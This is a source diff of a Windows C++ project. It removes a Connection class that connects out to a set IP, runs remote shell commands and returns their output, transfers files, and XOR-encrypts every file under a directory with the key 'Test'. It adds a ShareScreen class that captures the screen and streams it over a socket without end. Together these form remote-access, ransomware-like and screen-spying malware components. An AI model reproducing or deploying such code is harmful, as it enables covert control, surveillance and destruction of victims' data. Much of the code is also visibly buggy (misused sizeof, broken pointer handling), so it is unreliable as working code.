@@ -1,142 +1,131 @@
 //
-// Created by avita on 07/08/2020.
+// Created by avita on 09/08/2020.
 //
-
-#include "Connection.h"
-
-
-Connection::Connection(string ip, unsigned int port) {
-    Connection::ip = ip;
-    Connection::port = port;
+#include "ShareScreen.h"
 
 
-}
-
-void Connection::sendMessage(const string message, SOCKET socket) {
-    send(socket, reinterpret_cast<const char*>(&message), sizeof(message), 0);
-    return;
-}
+ShareScreen::ShareScreen() {}
 
 
-void Connection::sendFile(string path) {
-    ifstream file{ path, ifstream::binary };
-    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
+//Taking screenshot
+void ShareScreen::takeScreenShot() {
+    using namespace Gdiplus;
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    {
+        HDC scrdc, memdc;
+        HBITMAP membit;
+        scrdc = ::GetDC(0);
 
-    while (!file.eof()) {
-        file.read(buffer->data(), BufferSize);
-        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
-    }
-    file.close();
-    return;
-}
+        memdc = CreateCompatibleDC(scrdc);
+        membit = CreateCompatibleBitmap(scrdc, Width, Height);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
+        BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
+        Gdiplus::Bitmap bitmap(membit, NULL);
 
-void Connection::recvFile(string path) {
-    ofstream file(path, fstream::binary);
-    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
-    int size;
-
-    while (true) {
-        size = recv(sock, buffer->data(), BufferSize, 0);
-        if (!buffer->data() || size < 1024) {
-            file.write(buffer->data(), size);
-            file.flush();
-            file.close();
-            break;
+        CLSID clsid;
+        GetEncoderClsid(L"image/jpeg", &clsid);
+        //        bitmap.Save((IStream *) path, &clsid);
+        //bitmap.Save(path, &clsid);
+        if (!change) {
+            insertColor(bitmap, img1);
+            change = true;
         }
-        file.write(buffer->data(), size);
+        else {
+            insertColor(bitmap, img2);
+            change = false;
+        }
+
+        SelectObject(memdc, hOldBitmap);
+        DeleteObject(memdc);
+        DeleteObject(membit);
+        ::ReleaseDC(0, scrdc);
     }
-    return;
+    GdiplusShutdown(gdiplusToken);
 }
 
-vector<filesystem::path>& Connection::getAllFiles(string path, vector<filesystem::path> files) {
-
-
-    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
-        files.push_back(file.path());
+//Help function to takeScreenShot
+int ShareScreen::GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0; // number of image encoders
+    UINT size = 0; // size of the image encoder array in bytes
+    ImageCodecInfo* pImageCodecInfo = NULL;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0)
+        return -1; // Failure
+    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL)
+        return -1; // Failure
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j; // Success
+        }
     }
-    return files;
+    free(pImageCodecInfo);
+    return 0;
 }
 
-string Connection::readFile(filesystem::path path) {
-    ifstream file{ path.string(), ifstream::binary };
-    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
-
-    while (!file.eof()) {
-        file.read(buffer->data(), BufferSize);
-        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
+//Insert to any pixel in pixels a color from img1 or img2
+void ShareScreen::insertColor(Bitmap& bitmap, Color** pixels[1440][2580]) {
+    Color color;
+    for (int i = 0; i < 1440; i++) {
+        for (int j = 0; j < 2580; j++) {
+            bitmap.GetPixel(i, j, &color);
+            **pixels[i][j] = color;
+        }
     }
-    file.close();
-    return buffer->data();
 }
 
-void Connection::writeToFile(filesystem::path path, string data) {
-    ofstream file{ path.string(), ofstream::binary };
-    file.write(data.c_str(), sizeof(data));
-    file.flush();
-    file.close();
-    return;
-}
+//Comparing two images and returning the bytes that changed
+Color** ShareScreen::compareImages(Color** img1[1440][2580], Color** img2[1440][2580]) {
 
-string Connection::encryptData(string data, string key) {
 
-    if (key.size() < data.size()) {
-        for (int i = 0; i < data.size(); i++) {
-            key += key.at(i);
-            if (key.size() == data.size()) {
-                break;
+    Color** imgDifference = nullptr;
+    imgDifference = reinterpret_cast<Color**>(new int* [1440]);
+    for (int h = 0; h < 1440; h++) {
+        imgDifference[h] = reinterpret_cast<Color*>(new int[2580]);
+        for (int w = 0; w < 2580; w++) {
+            if ((**img1[h][w]).GetValue() != (**img2[h][w]).GetValue()) {
+                if (change) {
+                    imgDifference[h][w] = **img2[h][w];
+                    continue;
+                }
+                imgDifference[h][w] = **img1[h][w];
+                continue;
             }
+            imgDifference[h][w] = NULL;
         }
     }
-    string newData = "";
-    for (int i = 0; i < data.size(); i++) {
-        newData += char(int(data.at(i)) ^ int(key.at(i)));
-    }
-    return newData;
+    return imgDifference;
 }
 
-void Connection::encryptFiles(string path) {
-    getAllFiles(path, *files);
-    for (int i = 0; i < files->size(); i++) {
-        writeToFile(files->at(i), encryptData(readFile(files->at(i)), "Test"));
+//Screen sharing in the first time sending img1 and after sending the bytes that changed between img1 and img2
+void ShareScreen::ShareScreenLive(SOCKET socket) {
+    //This will be sending to the server if img1 != img2
+    Color** changedBytes = nullptr;
+
+
+    //First sending the first image (img1)
+    Color** imgToSend[1440][2580];
+    takeScreenShot();
+    **imgToSend = **img1;
+    send(socket, reinterpret_cast<const char*>(imgToSend), sizeof(imgToSend), 0);
+    delete** imgToSend;
+
+    //Sending every time the bytes that changed
+    try {
+        while (true) {
+            takeScreenShot();
+            changedBytes = compareImages(img1, img2);
+            send(socket, reinterpret_cast<const char*>(changedBytes), sizeof(changedBytes), 0);
+
+        }
+
     }
-}
-
-
-void Connection::executeShell(string shell) {
-    string output = to_string(system(shell.c_str()));
-    sendMessage(output, sock);
-    return;
-}
-
-
-void Connection::connection() {
-    WSADATA wsadata;
-    WORD ver = MAKEWORD(2, 2);
-    int wResult = WSAStartup(ver, &wsadata);
-
-    if (wResult != 0) {
-        cerr << "Cant start Winsock" << endl;
-        return;
+    catch (exception& e) {
+        cout << e.what() << endl;
     }
-
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) {
-        cerr << "Cant create socket" << WSAGetLastError << endl;
-        WSACleanup();
-        return;
-    }
-    sockaddr_in hint;
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(port);
-    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);
-
-    int connectionResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
-
-    if (connectionResult == INVALID_SOCKET) {
-        cerr << "Cant connect to server" << WSAGetLastError << endl;
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
-    return;
 }
